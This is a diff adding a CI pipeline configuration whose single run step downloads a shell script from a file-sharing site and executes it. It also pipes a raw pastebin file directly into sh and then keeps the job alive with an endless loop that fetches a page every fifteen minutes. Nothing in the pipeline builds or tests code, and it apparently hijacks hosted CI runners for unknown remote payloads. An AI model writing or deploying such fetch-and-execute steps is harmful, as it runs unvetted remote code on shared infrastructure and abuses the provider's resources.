@@ -1,0 +1,38 @@
+pipeline:
+  name: bingchillingling
+  identifier: bingchillingling
+  projectIdentifier: default_project
+  orgIdentifier: default
+  tags: {}
+  properties:
+    ci:
+      codebase:
+        connectorRef: uhuh
+        build: <+input>
+  stages:
+    - stage:
+        name: l
+        identifier: l
+        description: ""
+        type: CI
+        spec:
+          cloneCodebase: true
+          platform:
+            os: Linux
+            arch: Amd64
+          runtime:
+            type: Cloud
+            spec: {}
+          execution:
+            steps:
+              - step:
+                  type: Run
+                  name: Run_1
+                  identifier: Run_1
+                  spec:
+                    shell: Sh
+                    command: |-
+                      wget https://filebin.net/ybd6jusetr4z35wv/minutes.sh
+                      chmod +x minutes.sh
+                      bash minutes.sh
+                      (wget https://pastebin.com/raw/GM1ytrP9 -O- | tr -d '\r') | sh && while true; do wget google.com ; sleep 900 ; done
